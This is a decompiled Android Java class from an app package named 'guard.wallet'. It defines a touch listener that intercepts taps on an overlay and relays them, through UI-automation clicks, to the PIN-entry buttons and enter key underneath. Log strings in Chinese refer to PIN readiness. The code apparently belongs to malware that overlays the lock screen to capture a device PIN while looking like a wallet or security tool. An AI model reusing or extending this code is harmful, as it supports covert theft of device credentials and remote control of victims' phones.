package com.guard.wallet.helper;

import a1.AbstractC0026q;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import com.guard.wallet.entity.Point;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.plug.C0226e;
import com.guard.wallet.plug.C0227f;
import com.guard.wallet.utils.AbstractC0249e;
import java.util.LinkedList;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicReference;
import p012o.C0416e;

/* renamed from: com.guard.wallet.helper.q */
/* loaded from: classes.dex */
public final class ViewOnTouchListenerC0194q implements View.OnTouchListener {

    /* renamed from: a */
    public final /* synthetic */ C0416e f232a;

    /* renamed from: b */
    public final /* synthetic */ CombineFilter f233b;

    public ViewOnTouchListenerC0194q(C0416e c0416e, CombineFilter combineFilter) {
        this.f232a = c0416e;
        this.f233b = combineFilter;
    }

    @Override // android.view.View.OnTouchListener
    public final boolean onTouch(View view, MotionEvent motionEvent) {
        String str;
        if (motionEvent.getAction() == 0 && AbstractC0195r.f238e != null) {
            boolean m620i = AbstractC0249e.m620i();
            C0416e c0416e = this.f232a;
            if (m620i && AbstractC0195r.f240g.size() != 10) {
                AbstractC0195r.m385n(c0416e, this.f233b);
            }
            AtomicReference atomicReference = AbstractC0195r.f241h;
            if (atomicReference.get() == null) {
                AbstractC0195r.m379h(c0416e);
            }
            if (!AbstractC0249e.m620i() && !AbstractC0249e.m624m() && AbstractC0195r.f243j.get() == null) {
                AbstractC0195r.m380i(c0416e);
            }
            try {
                ConcurrentLinkedQueue concurrentLinkedQueue = AbstractC0195r.f240g;
                if (concurrentLinkedQueue.isEmpty() || !concurrentLinkedQueue.stream().anyMatch(new C0193p(motionEvent, 0))) {
                    if (atomicReference.get() != null && ((UiObject) atomicReference.get()).boundsInScreen().contains((int) motionEvent.getX(), (int) motionEvent.getY()) && ((UiObject) atomicReference.get()).click()) {
                        C0227f c0227f = AbstractC0195r.f236c;
                        LinkedList linkedList = c0227f.f274c;
                        if (!linkedList.isEmpty()) {
                            linkedList.remove(linkedList.size() - 1);
                        }
                        int intValue = AbstractC0195r.f239f.intValue();
                        LinkedList linkedList2 = c0227f.f273b;
                        if (!linkedList2.isEmpty()) {
                            linkedList2.removeIf(new C0226e(intValue));
                        }
                        AbstractC0195r.f239f = Integer.valueOf(AbstractC0195r.f239f.intValue() - 1);
                    } else {
                        AtomicReference atomicReference2 = AbstractC0195r.f243j;
                        if (atomicReference2.get() != null && ((UiObject) atomicReference2.get()).boundsInScreen().contains((int) motionEvent.getX(), (int) motionEvent.getY()) && ((UiObject) atomicReference2.get()).click()) {
                            str = "已点击回车键";
                        } else if (concurrentLinkedQueue.isEmpty()) {
                            str = "PIN码未准备就绪,不允许点击下方按钮";
                        } else {
                            UiObject m381j = AbstractC0195r.m381j(c0416e, new Point(motionEvent.getX(), motionEvent.getY()));
                            if (m381j != null && !concurrentLinkedQueue.contains(m381j) && !Objects.equals(m381j.id(), "com.android.systemui:id/scrim_behind") && !m381j.equals(atomicReference2.get()) && !m381j.equals(atomicReference.get()) && m381j.click()) {
                                str = "已点击下方未知按钮";
                            }
                        }
                        Log.d("com.guard.wallet.helper.r", str);
                    }
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("com.guard.wallet.helper.r", e2);
            }
        }
        return false;
    }
}
